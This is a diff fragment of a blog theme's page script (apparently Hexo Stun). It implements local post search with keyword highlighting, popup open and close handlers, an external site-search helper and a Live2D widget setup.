+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
